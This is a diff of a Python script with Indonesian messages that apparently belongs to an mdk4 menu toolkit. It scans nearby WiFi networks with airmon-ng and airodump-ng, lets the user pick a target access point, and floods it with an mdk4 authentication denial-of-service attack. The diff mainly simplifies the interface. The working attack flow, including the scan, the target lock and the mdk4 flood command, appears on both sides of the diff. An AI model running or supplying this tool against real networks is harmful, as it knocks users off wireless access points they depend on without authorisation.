@@ -8,137 +8,64 @@ import subprocess
 import sys
 import tempfile
 import time
-import signal
 
-# ---------- ANSI ----------
+GREEN = "\033[92m"
+RED = "\033[91m"
+CYAN = "\033[96m"
+MAGENTA = "\033[95m"
+YELLOW = "\033[93m"
 RESET = "\033[0m"
 BOLD = "\033[1m"
-CLEAR = "\033[2J\033[H"
 
-COLORS = {
-    "green": "\033[92m",
-    "red": "\033[91m",
-    "cyan": "\033[96m",
-    "yellow": "\033[93m",
-    "magenta": "\033[35m",
-    "gray": "\033[90m",
-}
+GLITCH_CHARS = "!@#$%^&*<>/\\|~?01"
+GLITCH_COLORS = [GREEN, RED, CYAN, MAGENTA, YELLOW]
 
-GREEN = COLORS["green"]
-RED = COLORS["red"]
-CYAN = COLORS["cyan"]
-YELLOW = COLORS["yellow"]
-MAGENTA = COLORS["magenta"]
-GRAY = COLORS["gray"]
-
-BOX_WIDTH = 50
-
-# ---------- GLOBAL FLAG UNTUK SIGNAL ----------
-should_exit = False
-monitor_iface_global = None
-
-# ================= CLEAR SCREEN =================
 
 def clear_screen():
-    sys.stdout.write(CLEAR)
-    sys.stdout.flush()
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-# ================= DRAW BOX =================
 
-def draw_box_top(color=CYAN):
-    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")
+def glitch_text(text):
+    return f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
 
-def draw_box_bottom(color=CYAN):
-    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")
 
-def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
-    inner = f" {title}"
-    pad = BOX_WIDTH - len(inner)
-    if pad < 0:
-        inner = inner[:BOX_WIDTH]
-        pad = 0
-    print(
-        f"  {color}{BOLD}║{RESET}"
-        f"{text_color}{BOLD}{inner}{RESET}"
-        f"{' ' * pad}"
-        f"{color}{BOLD}║{RESET}"
-    )
-
-def draw_box_line(text: str, color=GRAY):
-    pad = BOX_WIDTH - len(text)
-    if pad < 0:
-        text = text[:BOX_WIDTH]
-        pad = 0
-    print(
-        f"  {color}{BOLD}║{RESET}"
-        f"{text}{RESET}"
-        f"{' ' * pad}"
-        f"{color}{BOLD}║{RESET}"
-    )
-
-# ================= LOADING =================
-
-def loading(text, duration=1):
-    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
-    for i in range(duration * 10):
-        if should_exit:
-            break
-        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write("\r" + " " * 60 + "\r")
-    sys.stdout.flush()
-
-def loading_with_text(text, duration=2):
-    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
-    glitch_chars = "!@#$%^&*"
-    
-    for i in range(duration * 10):
-        if should_exit:
-            break
-        display_text = ""
-        for char in text:
-            if char == " ":
-                display_text += " "
-            elif random.random() < 0.1:
-                display_text += random.choice(glitch_chars)
-            else:
-                display_text += char
-                
-        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write("\r" + " " * 60 + "\r")
-    sys.stdout.flush()
-
-def glitch_print(text, color=GREEN, cycles=8):
-    chars = "!@#$%^&*<>/\\|~?"
+def glitch_print(text, delay=0.02, rounds=8):
     n = len(text)
-    revealed = [False] * n
-    
-    for c in range(cycles):
-        if should_exit:
-            break
-        display = []
-        for i, ch in enumerate(text):
-            if ch == " ":
-                display.append(" ")
-                continue
-            if revealed[i]:
-                display.append(ch)
-            else:
-                if random.random() < (c / cycles):
-                    revealed[i] = True
-                    display.append(ch)
-                else:
-                    display.append(random.choice(chars))
-        sys.stdout.write(f"\r  {color}{''.join(display)}{RESET}")
-        sys.stdout.flush()
-        time.sleep(0.04)
-    
-    print(f"\r  {color}{text}{RESET}")
+    settled = [False] * n
 
-# ================= WIRELESS FUNCTIONS =================
+    for r in range(rounds):
+        settle_ratio = (r + 1) / rounds
+        line = ""
+        for i, c in enumerate(text):
+            if c == " ":
+                line += " "
+                continue
+
+            if settled[i]:
+                line += f"{GREEN}{c}{RESET}"
+                continue
+
+            if random.random() < settle_ratio * 0.5:
+                settled[i] = True
+                line += f"{GREEN}{c}{RESET}"
+            else:
+                glitch_char = random.choice(GLITCH_CHARS)
+                color = random.choice(GLITCH_COLORS)
+                line += f"{color}{glitch_char}{RESET}"
+
+        sys.stdout.write("\r" + line + "\033[K")
+        sys.stdout.flush()
+        time.sleep(delay)
+
+    for _ in range(2):
+        flash = f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
+        sys.stdout.write("\r" + flash + "\033[K")
+        sys.stdout.flush()
+        time.sleep(0.05)
+
+    sys.stdout.write("\r" + f"{GREEN}{text}{RESET}" + "\033[K" + "\n")
+    sys.stdout.flush()
+
 
 def get_wireless_interfaces():
     output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
@@ -151,6 +78,7 @@ def get_wireless_interfaces():
                 continue
             interfaces.append(name)
     return interfaces
+
 
 def get_monitor_interface_name(adapter, output):
     current_ifaces = get_wireless_interfaces()
@@ -179,28 +107,45 @@ def get_monitor_interface_name(adapter, output):
 
     return f"{adapter}mon"
 
-def run_command(cmd, show_output=False):
+
+def run_command(cmd, description=None, show_output=True):
+    if description:
+        print(f"\n{CYAN}>{description}{RESET}")
+
+    if show_output:
+        print(f"{YELLOW}{' '.join(cmd)}{RESET}")
+
     result = subprocess.run(cmd, capture_output=True, text=True)
+    if show_output:
+        if result.stdout:
+            print(result.stdout.strip())
+        if result.stderr:
+            print(result.stderr.strip())
+
     if result.returncode != 0:
+        print(f"{RED}Perintah gagal: {' '.join(cmd)}{RESET}")
         return None
     return result
 
+
 def start_monitor_mode(adapter):
-    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
-    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
-    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
-    
+    glitch_print(f"ACTIVATING MONITOR MODE ON {adapter}...")
+    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
+    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
+    print("")
     if result is None:
         return adapter
 
     output = (result.stdout or "") + (result.stderr or "")
     monitor_iface = get_monitor_interface_name(adapter, output)
-    time.sleep(0.3)
+    time.sleep(1)
+    print(glitch_text(f"> Interface monitor aktif: {monitor_iface}"))
+    print()
     return monitor_iface
 
+
 def scan_networks(adapter, duration=10):
-    loading_with_text("Scanning WiFi networks...", 1)
-    
+    glitch_print("SCANNING WIFI NETWORKS...")
     temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
     prefix = os.path.join(temp_dir, "scan")
     proc = subprocess.Popen(
@@ -209,40 +154,16 @@ def scan_networks(adapter, duration=10):
         stderr=subprocess.DEVNULL,
     )
 
-    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
-    start_time = time.time()
-    
-    while proc.poll() is None:
-        if should_exit:
+    try:
+        time.sleep(duration)
+    finally:
+        if proc.poll() is None:
             proc.terminate()
-            break
-        elapsed = int(time.time() - start_time)
-        remaining = max(0, duration - elapsed)
-        
-        if remaining <= 0:
-            break
-            
-        for i in range(len(chars)):
-            if should_exit:
-                break
-            if proc.poll() is not None or elapsed >= duration:
-                break
-            sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}Scanning... {remaining}s remaining{RESET}")
-            sys.stdout.flush()
-            time.sleep(0.1)
-            elapsed = int(time.time() - start_time)
-            remaining = max(0, duration - elapsed)
-    
-    sys.stdout.write("\r" + " " * 60 + "\r")
-    sys.stdout.flush()
-
-    if proc.poll() is None:
-        proc.terminate()
-        try:
-            proc.wait(timeout=5)
-        except subprocess.TimeoutExpired:
-            proc.kill()
-            proc.wait()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait()
 
     networks = []
     seen = set()
@@ -255,19 +176,13 @@ def scan_networks(adapter, duration=10):
                 bssid = row[0].strip()
                 channel = row[3].strip()
                 essid = row[13].strip()
-                power = row[8].strip() if len(row) > 8 else "N/A"
                 if not bssid or bssid.lower() == "bssid" or not essid:
                     continue
                 key = (bssid, channel, essid)
                 if key in seen:
                     continue
                 seen.add(key)
-                networks.append({
-                    "bssid": bssid, 
-                    "channel": channel, 
-                    "essid": essid,
-                    "power": power
-                })
+                networks.append({"bssid": bssid, "channel": channel, "essid": essid})
 
     for path in glob.glob(prefix + "-*.csv"):
         try:
@@ -281,9 +196,9 @@ def scan_networks(adapter, duration=10):
 
     return networks
 
+
 def stop_monitor_mode(monitor_iface):
-    loading("Membersihkan monitor mode...", 1)
-    
+    glitch_print("STOPPING MONITOR MODE...")
     candidates = [monitor_iface]
     if monitor_iface.endswith("mon"):
         candidates.append(monitor_iface[:-3])
@@ -291,316 +206,147 @@ def stop_monitor_mode(monitor_iface):
         candidates.append(f"{monitor_iface}mon")
 
     for name in candidates:
-        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
+        result = run_command(["sudo", "airmon-ng", "stop", name], "MEMATIKAN MONITOR MODE", show_output=False)
         if result is not None:
             break
 
-    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)
+    run_command(["sudo", "systemctl", "restart", "NetworkManager"], "RESTART NETWORKMANAGER", show_output=False)
 
-def get_power_status(power):
-    if power == "N/A":
-        return "N/A", GRAY
-    try:
-        pwr = int(power)
-        if pwr >= -30:
-            return "Kuat", GREEN
-        elif pwr >= -50:
-            return "Kuat", CYAN
-        elif pwr >= -70:
-            return "Sedang", YELLOW
-        else:
-            return "Lemah", RED
-    except ValueError:
-        return "N/A", GRAY
-
-# ================= SELECT FUNCTIONS =================
 
 def select_interface():
-    clear_screen()
-    draw_box_top(CYAN)
-    draw_box_title("AUTH DOS ATTACK", CYAN, YELLOW)
-    draw_box_bottom(CYAN)
-    
-    loading("Scanning interfaces...", 1)
+    glitch_print("SCANNING INTERFACES...")
     ifaces = get_wireless_interfaces()
     if not ifaces:
-        print(f"\n  {RED}[✗] Tidak ada interface ditemukan.{RESET}")
+        print("Ga ada interface ditemukan.")
         sys.exit(1)
 
-    print(f"\n  {BOLD}Pilih interface:{RESET}")
+    print(f"\n{BOLD}Pilih interface:{RESET}")
     for idx, name in enumerate(ifaces, start=1):
-        print(f"  {GREEN}{idx}.{RESET} {name}")
+        print(f"{GREEN}{idx}.{RESET} {name}")
 
     while True:
-        if should_exit:
-            sys.exit(0)
-        choice = input(f"\n  {YELLOW}>> nomor : {RESET}").strip()
+        choice = input("\nNomor: ").strip()
         if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
             selected = ifaces[int(choice) - 1]
-            glitch_print(f"LOCKED: {selected}", CYAN)
-            time.sleep(0.3)
+            glitch_print(f"LOCKED: {selected}")
+            clear_screen()
             return selected
-        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")
+        print("Input salah, coba lagi.")
+
 
 def select_target(networks):
     if not networks:
-        print(f"\n  {RED}[✗] Tidak ada jaringan ditemukan.{RESET}")
+        print("Ga ada jaringan yang ketemu.")
         return None
 
-    clear_screen()
-    draw_box_top(CYAN)
-    draw_box_title("PILIH TARGET", CYAN, YELLOW)
-    draw_box_bottom(CYAN)
-
-    no_width = 4
-    essid_width = 22
-    ch_width = 4
-    pwr_width = 6
-    signal_width = 9
-    bssid_width = 17
-    
-    header = f"{'No':<{no_width}} {'ESSID':<{essid_width}} {'CH':<{ch_width}} {'PWR':<{pwr_width}} {'SINYAL':<{signal_width}} {'BSSID'}"
-    print(f"\n  {header}")
-    print(f"  {YELLOW}{'=' * (no_width + essid_width + ch_width + pwr_width + signal_width + bssid_width + 5)}{RESET}")
-    
+    print(f"\n{BOLD}Pilih target WiFi:{RESET}")
+    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
+    print(header)
+    print("-" * len(header))
     for idx, net in enumerate(networks, start=1):
-        essid = net["essid"][:essid_width]
-        power = net.get("power", "N/A")
-        status, status_color = get_power_status(power)
-        
-        if power != "N/A":
-            try:
-                pwr = int(power)
-                if pwr >= -30:
-                    pwr_color = GREEN
-                elif pwr >= -50:
-                    pwr_color = CYAN
-                elif pwr >= -70:
-                    pwr_color = YELLOW
-                else:
-                    pwr_color = RED
-                power_display = f"{pwr_color}{power:>3}{RESET}"
-            except ValueError:
-                power_display = f"{GRAY}{power:>3}{RESET}"
-        else:
-            power_display = f"{GRAY}{power:>3}{RESET}"
-            
-        status_display = f"{status_color}{status}{RESET}"
-        
-        print(f"  {GREEN}{idx:<{no_width}}{RESET} {essid:<{essid_width}} {net['channel']:<{ch_width}} {power_display}  {status_display:<{signal_width}} {net['bssid']}")
+        essid = net["essid"][:20]
+        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")
 
     while True:
-        if should_exit:
-            sys.exit(0)
-        choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
+        choice = input("\nNomor target: ").strip()
         if choice.isdigit() and 1 <= int(choice) <= len(networks):
             selected = networks[int(choice) - 1]
-            power = selected.get("power", "N/A")
-            status, _ = get_power_status(power)
-            glitch_print(f"TARGET LOCKED: {selected['essid']} | PWR {power} | {status}", GREEN)
-            time.sleep(0.3)
+            glitch_print(f"TARGET LOCKED: {selected['essid']}")
             return selected
-        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")
+        print("Input salah, coba lagi.")
 
-# ================= ATTACK FUNCTIONS =================
 
 def run_attack(target, monitor_iface):
-    clear_screen()
-    draw_box_top(RED)
-    draw_box_title("AUTH DOS ATTACK", RED, YELLOW)
-    draw_box_bottom(RED)
-    
-    draw_box_line(f"  [*] Target: {target['essid']}", CYAN)
-    draw_box_line(f"  [*] BSSID: {target['bssid']}", CYAN)
-    draw_box_line(f"  [*] Channel: {target['channel']}", CYAN)
-    draw_box_line(f"  [!] Tekan Ctrl+C untuk menghentikan", YELLOW)
-    draw_box_bottom(RED)
-    
-    print()
-    
-    # Jalankan airodump-ng di background
+    print(f"\n{CYAN}Target terpilih:{RESET} {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")
     dump_cmd = [
-        "sudo", "airodump-ng",
-        "--bssid", target["bssid"],
-        "-c", target["channel"],
-        monitor_iface
+        "sudo",
+        "airodump-ng",
+        "--bssid",
+        target["bssid"],
+        "-c",
+        target["channel"],
+        monitor_iface,
     ]
-    
-    print(f"  {YELLOW}Menjalankan airodump-ng untuk target...{RESET}")
-    print(f"  {GRAY}{' '.join(dump_cmd)}{RESET}")
+    mdk4_cmd = [
+        "sudo",
+        "mdk4",
+        monitor_iface,
+        "a",
+        "-a",
+        target["bssid"],
+        "-s",
+        "1000",
+    ]
+
+    print(f"\n{YELLOW}Menjalankan airodump-ng untuk target...{RESET}")
+    print(f"{YELLOW}{' '.join(dump_cmd)}{RESET}")
     dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
-    
-    # Jalankan mdk4 auth dos
-    mdk4_cmd = [
-        "sudo", "mdk4", monitor_iface, "a",
-        "-a", target["bssid"],
-        "-s", "1000"
-    ]
-    
-    print(f"\n  {YELLOW}Menjalankan mdk4 auth dos...{RESET}")
-    print(f"  {GRAY}{' '.join(mdk4_cmd)}{RESET}")
-    print(f"  {GRAY}{'=' * 50}{RESET}\n")
-    
-    mdk4_proc = None
+
     try:
-        mdk4_proc = subprocess.Popen(mdk4_cmd)
-        # Loop untuk mengecek signal tiap detik
-        while mdk4_proc.poll() is None:
-            if should_exit:
-                print(f"\n  {YELLOW}[!] Signal exit diterima. Menghentikan serangan...{RESET}")
-                mdk4_proc.terminate()
-                try:
-                    mdk4_proc.wait(timeout=3)
-                except subprocess.TimeoutExpired:
-                    mdk4_proc.kill()
-                    mdk4_proc.wait()
-                break
-            time.sleep(1)
-        else:
-            # Jika proses selesai normal
-            pass
+        print(f"\n{YELLOW}Menjalankan mdk4 auth dos...{RESET}")
+        print(f"{YELLOW}{' '.join(mdk4_cmd)}{RESET}")
+        # Output MDK4 langsung ke terminal (deres)
+        result = subprocess.run(mdk4_cmd)
+        if result.returncode != 0 and result.returncode != -2:
+            print(f"{RED}MDK4 auth dos gagal dengan kode keluar {result.returncode}.{RESET}")
     except KeyboardInterrupt:
-        print(f"\n  {YELLOW}[!] Keyboard interrupt diterima. Menghentikan serangan...{RESET}")
-        if mdk4_proc and mdk4_proc.poll() is None:
-            mdk4_proc.terminate()
-            try:
-                mdk4_proc.wait(timeout=3)
-            except subprocess.TimeoutExpired:
-                mdk4_proc.kill()
-                mdk4_proc.wait()
+        print(f"\n{YELLOW}Keyboard interrupt diterima. Menghentikan serangan...{RESET}")
+        # MDK4 akan berhenti dengan SIGINT, tinggal cleanup
     finally:
-        if dump_proc and dump_proc.poll() is None:
+        if dump_proc.poll() is None:
             dump_proc.terminate()
             try:
-                dump_proc.wait(timeout=3)
+                dump_proc.wait(timeout=5)
             except subprocess.TimeoutExpired:
                 dump_proc.kill()
                 dump_proc.wait()
 
-def prompt_post_attack():
-    print(f"\n  {BOLD}Pilih opsi:{RESET}")
-    print(f"  {GREEN}1.{RESET} Attack Again")
-    print(f"  {GREEN}0.{RESET} Back to Menu")
-    print(f"  {GREEN}99.{RESET} Exit")
-    
-    while True:
-        if should_exit:
-            sys.exit(0)
-        choice = input(f"\n  {YELLOW}>> pilihan : {RESET}").strip()
-        if choice == "1":
-            return "again"
-        elif choice == "0":
-            return "menu"
-        elif choice == "99":
-            return "exit"
-        else:
-            print(f"  {RED}[!] Pilih 1, 0, atau 99.{RESET}")
 
-def back_to_mdk4_menu():
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    menu_path = os.path.join(script_dir, "mdk4-menu.py")
-    
-    possible_paths = [
-        menu_path,
-        os.path.join(script_dir, "..", "mdk4-menu.py"),
-        os.path.join(script_dir, "..", "..", "mdk4-menu.py"),
-    ]
-    
-    for path in possible_paths:
-        if os.path.exists(path):
-            os.execvp(sys.executable, [sys.executable, path])
-            return
-    
-    print(f"\n  {RED}[✗] mdk4-menu.py tidak ditemukan.{RESET}")
-    input("\n  Tekan Enter untuk kembali...")
-    sys.exit(0)
+def back_to_menu():
+    menu_path = os.path.join(os.path.dirname(__file__), "mdk4-menu.py")
+    if not os.path.exists(menu_path):
+        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "mdk4-menu.py"))
+    os.execvp(sys.executable, [sys.executable, menu_path])
 
-# ================= SIGNAL HANDLER =================
-
-def signal_handler(sig, frame):
-    global should_exit, monitor_iface_global
-    print(f"\n  {YELLOW}[!] Signal {sig} diterima. Membersihkan...{RESET}")
-    should_exit = True
-    if monitor_iface_global:
-        stop_monitor_mode(monitor_iface_global)
-    sys.exit(0)
-
-# ================= MAIN =================
 
 def main():
-    global monitor_iface_global, should_exit
-    
-    # Pasang signal handler
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-    
+    adapter = None
     monitor_iface = None
-    
+
     while True:
         try:
-            # Pilih interface dulu
-            adapter = select_interface()
-            monitor_iface = start_monitor_mode(adapter)
-            monitor_iface_global = monitor_iface
-            
-            # Scan duration
-            clear_screen()
-            draw_box_top(CYAN)
-            draw_box_title("SCAN WIFI", CYAN, YELLOW)
-            draw_box_bottom(CYAN)
-            
-            print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
-            scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
-            
+            if monitor_iface is None:
+                adapter = select_interface()
+                monitor_iface = start_monitor_mode(adapter)
+
+            # Tanyakan durasi scan
+            print(f"\n{CYAN}Mau scan WiFi berapa detik? (default 10){RESET}")
+            scan_input = input(f"{YELLOW}>> detik : {RESET}").strip()
             if scan_input.isdigit() and int(scan_input) > 0:
                 scan_duration = int(scan_input)
             else:
                 scan_duration = 10
-            
+
             networks = scan_networks(monitor_iface, duration=scan_duration)
-            if should_exit:
-                break
-                
             target = select_target(networks)
-            if should_exit:
-                break
-            
+
             if target is None:
-                print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
-                stop_monitor_mode(monitor_iface)
-                back_to_mdk4_menu()
-                return
-            
+                print("\nTidak ada target terpilih, kembali ke awal.")
+                continue
+
             run_attack(target, monitor_iface)
-            if should_exit:
-                break
-            
-            print("\n  Membersihkan sesi...")
+            print("\nMembersihkan sesi...")
             stop_monitor_mode(monitor_iface)
-            monitor_iface_global = None
-            
-            while True:
-                if should_exit:
-                    break
-                post_choice = prompt_post_attack()
-                if post_choice == "again":
-                    monitor_iface = None
-                    break
-                elif post_choice == "menu":
-                    back_to_mdk4_menu()
-                elif post_choice == "exit":
-                    clear_screen()
-                    print(f"\n  {GREEN}[✓] Terima kasih!{RESET}")
-                    sys.exit(0)
-                
+            break
+
         except KeyboardInterrupt:
-            # Ini seharusnya sudah ditangani oleh signal handler, tapi jaga-jaga
-            print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
+            print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
             if monitor_iface:
                 stop_monitor_mode(monitor_iface)
-            print("  Keluar dari program.")
+            print("Keluar dari program.")
             sys.exit(0)
+
 
 if __name__ == "__main__":
     main()
